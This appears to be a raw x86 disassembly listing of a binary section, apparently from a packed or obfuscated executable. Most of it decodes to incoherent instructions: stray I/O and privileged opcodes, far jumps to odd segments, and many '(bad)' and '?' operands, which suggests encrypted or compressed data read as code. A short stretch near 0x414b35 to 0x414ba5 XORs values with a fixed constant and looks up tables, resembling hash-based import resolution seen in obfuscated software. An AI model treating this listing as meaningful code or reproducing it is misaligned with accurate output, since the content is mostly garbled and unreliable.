  4148cd:	push   ds
  4148ce:	and    DWORD PTR [eax-0x26ea3cc7],esi
  4148d4:	mov    al,ds:0xf63c4c6c
  4148d9:	jno    0x4148d7
  4148db:	or     al,0x3
  4148dd:	xor    al,0xc0
  4148df:	fadd   DWORD PTR [esi-0x2a]
  4148e2:	pop    esi
  4148e3:	ror    DWORD PTR [edi+0x5d804a75],1
  4148e9:	sub    dl,ah
  4148eb:	xor    al,0x3f
  4148ed:	gs out dx,eax
  4148ef:	ficom  DWORD PTR [edx-0x62697e1d]
  4148f5:	lea    edx,[ebx+eax*4]
  4148f8:	mov    al,0x8e
  4148fa:	mov    ds:0x69e27e60,al
  4148ff:	pop    esp
  414900:	bound  eax,QWORD PTR [edi-0x710751a]
  414906:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414907:	cwde   
  414908:	adc    ecx,ecx
  41490a:	push   esp
  41490b:	mov    ebp,0x182d5ae4
  414910:	sahf   
  414911:	and    DWORD PTR [ecx+0x72],0x69
  414915:	xchg   edi,eax
  414916:	cmc    
  414917:	adc    eax,0x1a8a69d
  41491c:	sbb    BYTE PTR [edi],cl
  41491e:	clc    
  41491f:	stos   DWORD PTR es:[edi],eax
  414920:	call   0xc63dc75
  414925:	adc    al,0xb2
  414928:	xchg   ebx,eax
  414929:	cwde   
  41492a:	pop    es
  41492b:	neg    DWORD PTR [edi+0x7b00dcae]
  414931:	ins    DWORD PTR es:[edi],dx
  414932:	sub    esp,ebp
  414934:	jmp    0x9ac6:0x6d8dd878
  41493b:	xlat   BYTE PTR ds:[ebx]
  41493c:	mov    dl,BYTE PTR [edi]
  41493e:	pop    ss
  41493f:	cmp    DWORD PTR [eax+esi*8+0x61be03e6],esp
  414946:	adc    esp,DWORD PTR [ecx+0x1f]
  414949:	mov    dl,0x13
  41494b:	dec    ebx
  41494c:	repz mov bl,0x34
  41494f:	add    dl,BYTE PTR [ebx]
  414951:	mov    ds:0x2b12d823,al
  414956:	or     bl,BYTE PTR [ebx+0x78301d59]
  41495c:	aaa    
  41495d:	cmp    eax,0xc022c637
  414962:	sti    
  414963:	jp     0x414971
  414965:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414966:	xor    BYTE PTR [esi-0x62d01104],cl
  41496c:	jmp    0xfa33:0x26e58635
  414973:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414974:	pop    esp
  414975:	ret    
  414976:	push   ds
  414977:	test   DWORD PTR [ebp+0x3c],eax
  41497a:	cmp    BYTE PTR [edi],dl
  41497c:	push   ss
  41497d:	lods   eax,DWORD PTR ds:[esi]
  41497e:	adc    eax,0x86ae7ac6
  414983:	mov    WORD PTR [eax-0x61],ss
  414986:	jle    0x4149f1
  414988:	mov    edx,0x8c0274e0
  41498d:	out    0xf9,al
  41498f:	jo     0x4149e0
  414991:	inc    edi
  414992:	jmp    0x3d8:0xb70bd986
  414999:	mov    esp,0x40af7ae6
  41499e:	shr    BYTE PTR [edi],cl
  4149a0:	pop    es
  4149a1:	loop   0x414a0e
  4149a3:	imul   ebp,DWORD PTR [ebx+0x497afd29],0xdad44ea0
  4149ad:	dec    ebp
  4149ae:	lods   eax,DWORD PTR ds:[esi]
  4149af:	fprem  
  4149b1:	pop    ecx
  4149b2:	dec    ecx
  4149b3:	adc    DWORD PTR [ebp-0x3da69381],ecx
  4149b9:	fst    QWORD PTR [edx]
  4149bb:	inc    esp
  4149bd:	xor    DWORD PTR [edx+0x7bfa724e],esi
  4149c3:	std    
  4149c4:	ret    0x1762
  4149c7:	jns    0x4149c2
  4149c9:	sub    DWORD PTR [eax+0x53],ebp
  4149cc:	jmp    0x4149e5
  4149ce:	ds nop
  4149d0:	dec    ebp
  4149d1:	push   ds
  4149d2:	sbb    al,0xa1
  4149d4:	call   0x56801f08
  4149d9:	cs test al,0x2f
  4149dc:	out    dx,eax
  4149dd:	adc    al,0x4c
  4149df:	inc    edx
  4149e0:	bound  eax,QWORD PTR ds:0xcdc4fd54
  4149e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4149e7:	fisubr WORD PTR [eax]
  4149e9:	ss std 
  4149eb:	or     ah,bl
  4149ed:	lea    ecx,[esi]
  4149ef:	jbe    0x414a5d
  4149f1:	mov    eax,0xadd8f41d
  4149f6:	and    dh,al
  4149f8:	pop    ecx
  4149f9:	sub    eax,0xd42ae886
  4149fe:	fbld   TBYTE PTR [ecx+0x3e]
  414a01:	ins    BYTE PTR es:[edi],dx
  414a02:	inc    ebx
  414a03:	(bad)  
  414a04:	pop    esp
  414a05:	jg     0x4149a7
  414a07:	neg    DWORD PTR [ebx-0x67]
  414a0a:	add    ah,BYTE PTR [ebp+0x4f]
  414a0d:	push   esp
  414a0e:	test   BYTE PTR [ebx+0x5],0xe9
  414a12:	jl     0x4149ba
  414a14:	mov    cl,0xdd
  414a16:	mov    ebx,DWORD PTR ds:0x81ead237
  414a1c:	sar    DWORD PTR [edi-0x44811fbb],cl
  414a22:	jno    0x4149a4
  414a24:	jbe    0x4149e9
  414a26:	xchg   BYTE PTR [ebx+0x1a],dh
  414a29:	inc    ecx
  414a2a:	stos   BYTE PTR es:[edi],al
  414a2b:	mov    ds:0x8fb494a4,eax
  414a30:	call   0xc5869eca
  414a35:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414a36:	(bad)  [eax-0x1c]
  414a39:	xchg   esp,eax
  414a3a:	pop    ebx
  414a3b:	xor    eax,0x458e95eb
  414a40:	xor    al,0xaf
  414a42:	and    eax,0xe0f1a89e
  414a47:	fbld   TBYTE PTR [ebx+0x6a]
  414a4a:	push   ss
  414a4b:	mov    dh,0xb2
  414a4d:	pop    ecx
  414a4e:	gs loop 0x414a19
  414a51:	and    al,0x8f
  414a53:	mov    WORD PTR [ebx],?
  414a55:	mov    BYTE PTR [edx+0x41],ah
  414a58:	lahf   
  414a59:	sbb    eax,0x24376f8b
  414a5e:	or     al,0x8
  414a60:	ret    0xce8
  414a63:	xchg   ebx,eax
  414a64:	ficomp WORD PTR [edi+0x2b]
  414a67:	fistp  DWORD PTR [edx-0x5f]
  414a6a:	sbb    al,0x46
  414a6c:	inc    ebx
  414a6d:	hlt    
  414a6e:	ins    BYTE PTR es:[edi],dx
  414a6f:	clc    
  414a70:	jp     0x414ad0
  414a72:	dec    ebp
  414a73:	adc    bl,BYTE PTR [edi+edx*1]
  414a76:	(bad)  
  414a77:	inc    ecx
  414a78:	or     al,0xf4
  414a7a:	je     0x414ac5
  414a7c:	pop    es
  414a7d:	(bad)  
  414a7e:	call   DWORD PTR [ecx+0x26]
  414a81:	test   eax,0xcd82954b
  414a86:	xor    dl,0x34
  414a89:	xor    ch,BYTE PTR [esi+edx*2+0x14aae9c0]
  414a90:	mov    esp,0x4c9a4ff9
  414a95:	cmp    BYTE PTR [esi],al
  414a97:	sbb    ebp,DWORD PTR [edi-0x15]
  414a9a:	data16 adc ch,BYTE PTR [esi+eax*1-0xe]
  414a9f:	sub    al,0x38
  414aa1:	jns    0x414ab8
  414aa3:	js     0x414b1c
  414aa5:	mov    BYTE PTR [esi],0x2d
  414aa8:	pop    edi
  414aa9:	mov    edx,0xff21fee5
  414aae:	mov    ebp,0xf6254b4d
  414ab3:	call   0xde88:0xe4164711
  414aba:	dec    edx
  414abb:	(bad)  
  414abc:	test   eax,0x24491d50
  414ac1:	pop    es
  414ac2:	mov    ch,BYTE PTR [ecx]
  414ac4:	test   bl,ah
  414ac6:	sbb    DWORD PTR [esi-0x5b112a90],ebp
  414acc:	lods   al,BYTE PTR ds:[esi]
  414acd:	mov    esi,0xd983e124
  414ad2:	inc    eax
  414ad3:	mov    eax,ds:0x2c376c69
  414ad8:	lods   al,BYTE PTR ds:[esi]
  414ad9:	loop   0x414a62
  414adb:	jg     0x414a9d
  414add:	pop    esp
  414ade:	aaa    
  414adf:	inc    edi
  414ae0:	bound  eax,QWORD PTR [ecx]
  414ae2:	mov    esi,0xa969ddd3
  414ae7:	frstor [edx+edi*8+0x4c08ca1c]
  414aee:	xchg   edx,ecx
  414af0:	ins    DWORD PTR es:[edi],dx
  414af1:	lods   eax,DWORD PTR ds:[esi]
  414af2:	in     al,dx
  414af3:	out    0x99,eax
  414af5:	rcr    DWORD PTR [ecx-0x75a86d8e],1
  414afb:	xchg   edx,eax
  414afc:	mov    eax,ds:0x3e696c20
  414b01:	dec    esi
  414b02:	cmp    DWORD PTR [esi],eax
  414b04:	pop    eax
  414b05:	push   eax
  414b06:	(bad)  
  414b07:	imul   ebx,DWORD PTR [eax+eax*1-0x47]
  414b0c:	push   esi
  414b0d:	(bad)  
  414b0e:	pop    edi
  414b0f:	fdiv   DWORD PTR [edx+esi*8+0x3f230792]
  414b16:	out    0xfc,al
  414b18:	aaa    
  414b19:	cdq    
  414b1a:	inc    esp
  414b1b:	shr    BYTE PTR [esi],cl
  414b1d:	shl    DWORD PTR [ebx+0xa94f2cd],0xe5
  414b24:	arpl   sp,sp
  414b26:	sbb    BYTE PTR [esi-0x5b],0xf4
  414b2a:	cli    
  414b2b:	mov    cl,0x5d
  414b2d:	sub    bl,BYTE PTR [ebx-0x67]
  414b30:	fdivr  st,st(2)
  414b32:	test   al,0x3
  414b34:	ret    
  414b35:	cmp    ecx,eax
  414b37:	jne    0x414b5a
  414b3d:	mov    eax,DWORD PTR [ebp-0x20]
  414b40:	inc    edi
  414b41:	cmp    edi,eax
  414b43:	jb     0x413464
  414b49:	jmp    0x414b6a
  414b4e:	mov    eax,DWORD PTR [ebp-0x4]
  414b51:	xor    eax,esi
  414b53:	add    eax,ebx
  414b55:	jmp    0x417530
  414b5a:	mov    eax,DWORD PTR [ebp-0x2c]
  414b5d:	movzx  eax,WORD PTR [eax+edi*2]
  414b61:	mov    ecx,DWORD PTR [ebp-0x14]
  414b64:	mov    eax,DWORD PTR [ecx+eax*4]
  414b67:	mov    DWORD PTR [ebp+0xc],eax
  414b6a:	mov    eax,DWORD PTR [ebp-0x4]
  414b6d:	mov    ecx,DWORD PTR [ebp-0x8]
  414b70:	xor    eax,0x7510855
  414b75:	add    eax,ebx
  414b77:	cmp    ecx,eax
  414b79:	jne    0x414b8c
  414b7f:	mov    eax,DWORD PTR [ebp-0x4]
  414b82:	xor    eax,0x7510855
  414b87:	jmp    0x414b53
  414b8c:	mov    eax,DWORD PTR [ebp+0xc]
  414b8f:	add    eax,DWORD PTR [ebp+0x8]
  414b92:	mov    DWORD PTR [ebp-0x10],eax
  414b95:	mov    eax,DWORD PTR [ebp-0x1c]
  414b98:	test   eax,eax
  414b9a:	je     0x41638a
  414ba0:	mov    DWORD PTR [ebp-0x24],esi
  414ba3:	push   0xb
  414ba5:	jmp    0x414e89
  414baa:	icebp  
  414bab:	sbb    edi,DWORD PTR [edi-0xe9daa7e]
  414bb1:	imul   edi,edx,0x25
  414bb4:	outs   dx,DWORD PTR ds:[esi]
  414bb5:	stc    
  414bb6:	test   eax,0x5babc2d0
  414bbb:	jnp    0x414c3c
  414bbd:	jo     0x414b78
  414bbf:	jle    0x414c31
  414bc1:	jo     0x414c2b
  414bc3:	jg     0x414b86
  414bc5:	ficom  DWORD PTR [esi-0x66]
  414bc8:	(bad)  
  414bc9:	mov    ch,0xd5
  414bcb:	mov    al,ds:0x188f27ac
  414bd0:	arpl   WORD PTR [ebp-0x7f],bx
  414bd3:	rcl    BYTE PTR [ebx],cl
  414bd5:	call   0xac40f7fa
  414bda:	pop    ss
  414bdb:	sub    DWORD PTR [edx-0x29],esi
  414bde:	xchg   ebp,eax
  414bdf:	lds    edx,FWORD PTR [ebp-0x43ed13fd]
  414be5:	popf   
  414be6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414be7:	aam    0xa7
  414be9:	int3   
  414bea:	xor    eax,0x355da19e
  414bef:	fidiv  DWORD PTR [edi-0x42c20e31]
  414bf5:	xlat   BYTE PTR ds:[ebx]
  414bf6:	sub    eax,0x1278dff7
  414bfb:	inc    edi
  414bfc:	adc    al,0x33
  414bfe:	(bad)  
  414bff:	sbb    BYTE PTR ds:0xf6be6784,dh
  414c05:	and    ebp,DWORD PTR [esi+0x59bc63e9]
  414c0b:	pushf  
  414c0c:	je     0x414bb3
  414c0e:	jmp    0x7ff0e0a4
  414c13:	inc    esp
  414c14:	je     0x414be5
  414c16:	ins    DWORD PTR es:[edi],dx
  414c17:	lds    edi,FWORD PTR [edi-0x67725c3]
  414c1d:	xchg   BYTE PTR ds:0xf267067a,ch
  414c23:	dec    eax
  414c24:	fs jmp eax
  414c27:	xor    eax,0xfda565fd
  414c2c:	adc    BYTE PTR [eax+0x7fe9a0f],dl
  414c32:	arpl   WORD PTR [eax-0x6d],si
  414c35:	xor    DWORD PTR [esi],edx
  414c37:	dec    ebp
  414c38:	gs mov eax,0x59d640c4
  414c3e:	pop    ecx
  414c3f:	shr    eax,1
  414c41:	jg     0x414c86
  414c43:	cli    
  414c44:	mov    WORD PTR [edi+0xd],cs
  414c47:	cld    
  414c48:	mov    ebx,DWORD PTR [edi]
  414c4a:	ja     0x414be5
  414c4c:	ffree  st(7)
  414c4e:	sub    ecx,0x5479f31
  414c54:	xchg   edi,eax
  414c55:	xor    eax,edi
  414c57:	xchg   edx,eax
  414c58:	cwde   
  414c59:	xor    DWORD PTR [edi],esi
  414c5b:	lods   eax,DWORD PTR ds:[esi]
  414c5c:	fcmovnu st,st(4)
  414c5e:	retf   0xdeba
  414c61:	iret   
  414c62:	fnstsw WORD PTR [edi+0x1c]
  414c65:	loop   0x414c19
  414c67:	call   0xebeb2274
  414c6c:	mov    ah,0x3c
  414c6e:	inc    ebp
  414c6f:	cmovnp esi,DWORD PTR [eax]
  414c72:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414c73:	rol    DWORD PTR [ecx+eax*4],1
  414c76:	mov    eax,0x1354b53c
  414c7b:	push   0xffffff8a
  414c7d:	loopne 0x414c39
  414c7f:	xor    esi,DWORD PTR [edi-0x7a]
  414c82:	aas    
  414c83:	clc    
  414c84:	xchg   ebp,eax
  414c85:	out    dx,al
  414c86:	push   esi
  414c87:	mov    dl,0xa8
  414c89:	ret    0x5e6
  414c8c:	cmp    ch,BYTE PTR [eax+0x19]
  414c8f:	(bad)
  414c92:	and    ch,bl
  414c94:	pop    ds
  414c95:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414c96:	push   ecx
  414c97:	cdq    
  414c98:	(bad)  
  414c99:	ja     0x414ca6
  414c9b:	jp     0x414c3e
  414c9d:	clc    
  414c9e:	xchg   ebx,eax
  414c9f:	jmp    0x8a5bb998
  414ca4:	mov    dl,0x6b
  414ca6:	test   eax,0x4ac90626
  414cab:	cs dec ebx
  414cad:	dec    edi
  414cae:	aas    
  414caf:	push   0xda51747e
  414cb4:	dec    edx
  414cb5:	pop    eax
  414cb6:	int    0xdc
  414cb8:	sbb    eax,0x5ed9b9b7
  414cbd:	pop    esp
  414cbe:	mov    cs,WORD PTR [eax+0x56b58c98]
  414cc4:	pop    ebx
  414cc5:	sbb    ch,dh
  414cc7:	cmp    DWORD PTR [ebp+0x37],ebp
  414cca:	xor    ah,BYTE PTR fs:[edi-0x21]
  414cce:	and    DWORD PTR [esi+0x3833ae55],ebx
  414cd4:	xor    DWORD PTR [ecx],esp
  414cd6:	out    dx,al
  414cd7:	push   0xffffff9a
  414cd9:	je     0x414cc2
  414cdb:	dec    eax
  414cdc:	call   0x62f3:0x3517234f
  414ce3:	hlt    
  414ce4:	rcr    edx,0x26
  414ce7:	jns    0x414d48
  414ce9:	jmp    0x414c93
  414ceb:	into   
  414cec:	data16 jno 0x414cfe
  414cef:	dec    edi
  414cf0:	sub    eax,0x3b3f50a7
  414cf5:	push   eax
  414cf6:	jmp    0x4f8b:0xe57f82a7
  414cfd:	sti    
  414cfe:	pop    esp
  414cff:	icebp  
  414d00:	adc    al,0xd5
  414d02:	lahf   
  414d03:	mov    eax,0x7a535dd
  414d08:	jmp    0x3a6f:0x20a4
  414d0e:	or     al,dh
  414d10:	cmp    BYTE PTR gs:0xfebc53a4,0xe1
  414d18:	adc    eax,0xfa08868e
  414d1d:	jne    0x414d95
  414d1f:	call   0x2805:0xe8a2133d
  414d26:	mov    dl,BYTE PTR [ecx-0x462a892d]
  414d2c:	xor    al,0x1e
  414d2e:	sub    esi,ecx
  414d30:	out    dx,al
  414d31:	stos   DWORD PTR es:[edi],eax
  414d32:	push   es
  414d33:	shr    BYTE PTR [ecx-0x33],1
  414d36:	xchg   esi,eax
  414d37:	arpl   WORD PTR [edx+0x6f5d850f],bx
  414d3d:	cmc    
  414d3e:	gs push 0x42
  414d41:	cmp    al,0x1f
  414d43:	xor    al,0xbd
  414d45:	mov    ecx,0x4e128375
  414d4a:	out    dx,eax
  414d4b:	popa   
  414d4c:	mov    eax,0xab07000f
  414d51:	sbb    BYTE PTR [ebp+0x22],ch
  414d54:	inc    ebp
  414d55:	fwait
  414d56:	cmp    BYTE PTR [edx-0x2a],dh
  414d59:	clc    
  414d5a:	and    BYTE PTR [ebp+0x45],dl
  414d5d:	stos   DWORD PTR es:[edi],eax
  414d5e:	mov    ah,0x1a
  414d60:	sub    edi,DWORD PTR [edi]
  414d62:	pop    ss
  414d63:	iret   
  414d64:	jecxz  0x414d82
  414d66:	pop    DWORD PTR [edi+0xf]
  414d69:	mov    edi,0xe0096f2b
  414d6e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414d6f:	xor    al,ch
  414d71:	cmp    eax,0xb2291c7f
  414d76:	jmp    0x414deb
  414d78:	adc    eax,0x88fb9f6
  414d7d:	xor    ecx,DWORD PTR [ecx+eax*8]
  414d80:	das    
  414d81:	repz mov cl,0xcf
  414d84:	sbb    esi,DWORD PTR [ebp-0xa]
  414d87:	jne    0x414d54
  414d89:	(bad)  
  414d8b:	ret    
  414d8c:	inc    esp
  414d8d:	xchg   ecx,eax
  414d8e:	lds    esp,FWORD PTR [ecx]
  414d90:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414d91:	lahf   
  414d92:	in     al,0xd
  414d94:	sahf   
  414d95:	push   es
  414d96:	rol    BYTE PTR [edx],0x78
  414d99:	mov    bl,0xec
  414d9b:	lea    esp,[edx-0x60]
  414d9e:	aaa    
  414d9f:	xchg   esp,eax
  414da0:	sub    al,0xd7
  414da2:	push   ecx
  414da3:	(bad)  
  414da4:	enter  0xe5f,0x90
  414da8:	test   ah,cl
  414daa:	(bad)  
  414dab:	push   ecx
  414dac:	es mov bl,cl
  414daf:	dec    edx
  414db0:	int    0x67
  414db2:	and    al,0x43
  414db4:	loop   0x414e24
  414db6:	nop
  414db7:	rol    DWORD PTR ds:0xb1ed2a47,0xea
  414dbe:	or     eax,0xd10ad0fa
  414dc3:	outs   dx,BYTE PTR ds:[esi]
  414dc4:	and    al,0x8d
  414dc6:	lds    ebp,FWORD PTR [edi-0x24]
  414dc9:	in     al,0x27
  414dcb:	adc    ecx,DWORD PTR [ebx]
  414dcd:	xor    BYTE PTR ds:0x8153923f,ah
  414dd3:	int    0x3e
  414dd5:	ss and eax,0x75f7f968
  414ddb:	ins    DWORD PTR es:[edi],dx
  414ddc:	(bad)  
  414ddd:	xchg   esi,eax
  414dde:	pushf  
  414ddf:	fimul  DWORD PTR [edx-0x5c20606e]
  414de5:	les    edi,FWORD PTR [ebp-0x33]
  414de8:	std    
  414de9:	std    
  414dea:	dec    esp
  414deb:	push   ebp
  414dec:	lahf   
  414ded:	pusha  
  414dee:	fcmove st,st(1)
  414df0:	dec    esi
  414df1:	adc    eax,0x85bdf686
  414df6:	xchg   esp,eax
  414df7:	dec    esi
  414df8:	imul   ecx,DWORD PTR [ebx-0x1d],0xffffff8f
  414dfc:	outs   dx,BYTE PTR ds:[esi]
  414dfd:	or     eax,0x70beb78a
  414e02:	mov    bh,0x70
  414e04:	das    
  414e05:	mov    al,ds:0x45e27c8
  414e0a:	mov    eax,ds:0x2e7ad773
  414e0f:	sbb    eax,0x5dc4a9e2
  414e14:	fld    TBYTE PTR [ebx+0x2721048b]
  414e1a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414e1b:	sti    
  414e1c:	mov    ecx,0xca13ec3d
  414e21:	addr16 fcomp QWORD PTR [bp+si]
  414e25:	sbb    al,0x55
  414e27:	pop    ss
  414e28:	popa   
  414e29:	icebp  
  414e2a:	xchg   DWORD PTR [ecx-0x73],esi
  414e2d:	jne    0x414e3b
  414e2f:	push   esp
  414e30:	sub    al,0x57
  414e32:	pop    DWORD PTR [edx-0x4aa9054]
  414e38:	push   ds
  414e39:	xchg   ecx,eax
  414e3a:	push   cs
  414e3b:	stos   BYTE PTR es:[edi],al
  414e3c:	xor    eax,0xedc48461
  414e41:	sahf   
  414e42:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414e43:	in     eax,dx
  414e44:	jg     0x414e89
  414e46:	add    DWORD PTR [ebx+0x3e0b969d],0x1bd637db
  414e50:	ds iret 
  414e52:	hlt    
  414e53:	test   eax,0x904d5eb5
  414e58:	pusha  
  414e59:	mov    WORD PTR [ecx+0xc],fs
  414e5c:	mov    WORD PTR [bp+di],es
  414e5f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414e60:	inc    eax
  414e61:	jb     0x414e00
  414e63:	inc    eax
  414e64:	ins    DWORD PTR es:[edi],dx
  414e65:	ret    
  414e66:	cdq    
  414e67:	scas   al,BYTE PTR es:[edi]
  414e68:	cdq    
  414e69:	adc    al,0x5c
  414e6b:	sbb    BYTE PTR [ebx],bh
  414e6d:	sub    DWORD PTR [esi-0x39869e80],eax
  414e73:	jge    0x414e6e
  414e75:	fcomp  st(4)
  414e77:	jg     0x414edc
  414e79:	xor    BYTE PTR [esp+eiz*2],bh
  414e7c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414e7d:	mov    eax,ds:0x77466e4a
  414e82:	cmp    DWORD PTR [ebp-0x3e],ecx
  414e85:	shl    BYTE PTR [ebx],cl
  414e87:	ins    BYTE PTR es:[edi],dx
  414e88:	sub    BYTE PTR [ecx+0x6a],bl
  414e8b:	add    eax,0xcb875b49
  414e90:	sub    ebx,ecx
  414e92:	xchg   ebx,ecx
  414e94:	dec    ecx
  414e95:	mov    eax,DWORD PTR [ebp-0x1c]
  414e98:	imul   eax,ecx
  414e9b:	jmp    0x41517f
  414ea0:	aas    
  414ea1:	fidivr DWORD PTR [ebp-0x79]
  414ea4:	sbb    DWORD PTR [ebx+0x45],esp
  414ea7:	bound  eax,QWORD PTR [ebp+0x1d]
  414eaa:	sub    al,0x44
  414eac:	fbld   TBYTE PTR [esi+0x78a45f56]
  414eb2:	jg     0x414f24
  414eb4:	mov    ecx,0x4b70707e
  414eb9:	aam    0x75
  414ebb:	daa    
  414ebc:	jp     0x414eba
  414ebe:	xchg   ebx,eax
  414ebf:	(bad)  
  414ec0:	out    dx,eax
  414ec1:	fnstenv [esp+edx*8+0xc]
  414ec5:	pop    esp
  414ec6:	cld    
  414ec7:	fsubr  DWORD PTR [ebx]
  414ec9:	retf   
  414eca:	push   esi
  414ecb:	mov    edi,0xc2f6cc05
  414ed0:	ret    
  414ed1:	enter  0xd071,0xc3
  414ed5:	es inc esp
  414ed7:	rcl    al,1
  414ed9:	mov    esi,0x9d0d0715
  414ede:	xor    esp,esi
  414ee0:	pop    edx
  414ee1:	repz and BYTE PTR [ecx+ebx*4+0x4709a562],dh
  414ee9:	mov    dh,al
  414eeb:	add    DWORD PTR [eax-0x2a25430b],edx
  414ef1:	outs   dx,DWORD PTR ds:[esi]
  414ef2:	mov    ds:0xc7e5412b,al
  414ef7:	push   esi
  414ef8:	sub    BYTE PTR [ebp+0x2c],bl
  414efb:	xor    eax,DWORD PTR ds:0x6245e304
  414f01:	sub    al,0x19
  414f03:	pop    edi
  414f04:	mov    eax,0xdd1a5e5f
  414f09:	xor    ecx,ebp
  414f0b:	sbb    eax,0xe35dc2d5
  414f10:	loope  0x414ebd
  414f12:	mov    cl,0x85
  414f14:	add    eax,0x171ab572
  414f19:	in     al,0x11
  414f1b:	sti    
  414f1c:	clc    
  414f1d:	loop   0x414f15
  414f1f:	test   al,0x6e
  414f21:	add    eax,0xfb0fdc31
  414f26:	clc    
  414f27:	bound  esi,QWORD PTR [eax+0x13034359]
  414f2d:	and    DWORD PTR [eax],esp
  414f2f:	fwait
  414f30:	push   ds
  414f31:	pop    edx
  414f32:	stos   BYTE PTR es:[edi],al
  414f33:	cmp    dl,BYTE PTR [edx-0xf]
  414f36:	jno    0x414eec
  414f38:	lds    ebx,FWORD PTR [edi+0xb]
  414f3b:	dec    esp
  414f3c:	inc    ebp
  414f3d:	pop    edx
  414f3e:	mov    ah,0x38
  414f40:	mov    cl,0x3b
  414f42:	fmul   st(5),st
  414f44:	mov    al,ds:0x9be4ef14
  414f49:	rol    BYTE PTR [ecx+0x1baced48],1
  414f4f:	loope  0x414f5b
  414f51:	ficomp WORD PTR [ebx+0x34]
  414f54:	jl     0x414f20
  414f56:	xchg   ecx,eax
  414f57:	jae    0x8ebe964d
  414f5d:	mov    esi,0xbc01a691
  414f62:	cmp    al,0x28
  414f64:	neg    BYTE PTR [ebx]
  414f66:	fstp   QWORD PTR [eax]
  414f68:	call   0x1049:0xd15ea025
  414f6f:	xchg   DWORD PTR [ebp+0x4f],eax
  414f72:	fcmovnbe st,st(0)
  414f74:	jl     0x414f42
  414f76:	loope  0x414fbf
  414f78:	inc    edi
  414f79:	leave  
  414f7a:	ins    BYTE PTR es:[edi],dx
  414f7b:	mov    ch,0xa5
  414f7d:	xchg   DWORD PTR [esi],ebp
  414f7f:	inc    ecx
  414f80:	pop    eax
  414f81:	mov    ebp,0xbe44c61e
  414f86:	push   edx
  414f87:	in     al,0xe4
  414f89:	loope  0x414ff1
  414f8b:	repz mov ds:0x606525c2,eax
  414f91:	sbb    al,0x1a
  414f93:	hlt    
  414f94:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414f95:	jno    0x414f2c
  414f97:	jbe    0x414f5d
  414f99:	xchg   BYTE PTR [edx-0x27ef2a60],ah
  414f9f:	or     al,0x68
  414fa1:	xchg   ebx,eax
  414fa2:	pushf  
  414fa3:	scas   eax,DWORD PTR es:[edi]
  414fa4:	mov    dh,0x1a
  414fa6:	xor    al,0xf1
  414fa8:	and    eax,0x427cca68
  414fad:	fsubrp st(3),st
  414faf:	cdq    
  414fb0:	ja     0x414fca
  414fb2:	ins    DWORD PTR es:[edi],dx
  414fb3:	pop    edx
  414fb4:	je     0x41502e
  414fb6:	jns    0x415023
  414fb8:	pop    edx
  414fb9:	repnz icebp 
  414fbb:	icebp  
  414fbc:	mov    ecx,0xa8b963b5
  414fc1:	jns    0x41501a
  414fc3:	mov    cl,0x9f
  414fc5:	mov    al,0xc5
  414fc7:	mov    bh,0x83
  414fc9:	imul   DWORD PTR [ecx-0x5b81a1ca]
  414fcf:	gs ja  0x414f99
  414fd2:	jnp    0x414fb2
  414fd4:	mov    esp,?
  414fd6:	add    al,0x67
  414fd8:	add    DWORD PTR [edx+0x7b],eax
  414fdb:	jbe    0x414fc3
  414fdd:	stc    
  414fde:	mov    esi,0xe1f633f3
  414fe3:	adc    edx,edi
  414fe5:	mov    gs,edx
  414fe7:	add    DWORD PTR [ebp-0x7e],edx
  414fea:	pop    esi
  414feb:	daa    
  414fec:	push   edi
  414fed:	xchg   ah,ch
  414fef:	xchg   edx,eax
  414ff0:	adc    ecx,DWORD PTR [edi+ebp*4+0x3af19dbb]
  414ff7:	repnz outs dx,BYTE PTR ds:[esi]
  414ff9:	out    dx,al
  414ffa:	sti    
  414ffb:	ins    DWORD PTR es:[edi],dx
  414ffc:	sbb    eax,0x28e49824
  415001:	adc    eax,0xc0d654bf
  415006:	into   
  415007:	imul   edi,DWORD PTR [ebp-0x3f18e68b],0xffffffcf
  41500e:	into   
  41500f:	std    
  415010:	ss in  al,0xae
  415013:	cwde   
  415014:	adc    ebx,0x1f7ce475
  41501a:	data16 jmp 0x415024
  41501d:	test   ch,cl
  41501f:	(bad)  
  415020:	in     eax,0x9e
  415022:	adc    dh,BYTE PTR [ecx+eiz*1]
  415025:	rol    BYTE PTR [edi+ecx*4],1
  415028:	psubsw mm0,mm0
  41502b:	rcr    BYTE PTR [ebx+0x4d],cl
  41502e:	lods   eax,DWORD PTR ds:[esi]
  41502f:	adc    BYTE PTR [ecx+0x6b],dl
  415032:	fs bnd jne 0x41506c
  415036:	cdq    
  415037:	(bad)  [eax-0x741e8c21]
  41503d:	(bad)  
  41503e:	cmp    DWORD PTR [esi],ebx
  415040:	push   ebx
  415041:	xor    BYTE PTR [ebp-0x7a6092ce],dl
  415047:	aaa    
  415048:	outs   dx,DWORD PTR ds:[esi]
  415049:	xor    bl,BYTE PTR [esi-0xf]
  41504c:	mov    ?,WORD PTR [edi+edx*4]
  41504f:	dec    ebp
  415050:	and    al,0xe0
  415052:	dec    ecx
  415053:	sbb    esp,edi
  415055:	jns    0x414fe4
  415057:	inc    eax
  415058:	cmp    al,0x40
  41505a:	iret   
  41505b:	sbb    eax,0xc0c113c2
  415060:	jnp    0x414fe5
  415062:	jae    0x415070
  415064:	or     ah,ah
  415066:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  415068:	sbb    BYTE PTR [ebx+0x5a2b90da],ah
  41506e:	loopne 0x415013
  415070:	or     ecx,DWORD PTR [edi]
  415072:	inc    esi
  415073:	test   al,0x3b
  415075:	xchg   DWORD PTR [esi+0x6641c7ba],esi
  41507b:	(bad)  
  41507c:	fsub   st(4),st
  41507e:	push   eax
  41507f:	sar    DWORD PTR [ecx],0xa6
  415082:	or     dh,ah
  415084:	adc    al,0x7
  415086:	popf   
